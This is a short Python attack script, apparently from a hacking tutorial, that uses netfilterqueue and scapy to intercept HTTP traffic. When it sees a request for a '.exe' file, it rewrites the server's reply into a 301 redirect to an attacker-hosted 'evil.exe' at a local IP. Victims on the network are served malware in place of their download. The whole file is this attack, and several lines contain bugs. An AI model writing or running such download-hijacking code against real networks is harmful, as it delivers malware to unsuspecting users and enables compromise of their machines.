import netfilterqueue
import scapy.all as scapy


pack_list=[]

def set_load(packet,load):
    packet(scapy.Raw).load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet



def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] rar request")
                pack_list.append(scapy_packet(scapy.TCP).ack)

        elif scapy_packet[scapy.TCP].sport==80:
            if scapy_packet[scapy.TCP].seq in pack_list:
                pack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]Replacing file")
                mod_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permamently\nLocation :http://10.0.2.15/evil/evil.exe")
 

                packet.set_payload(bytes(mod_packet))

    packet.accept()
        
queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()



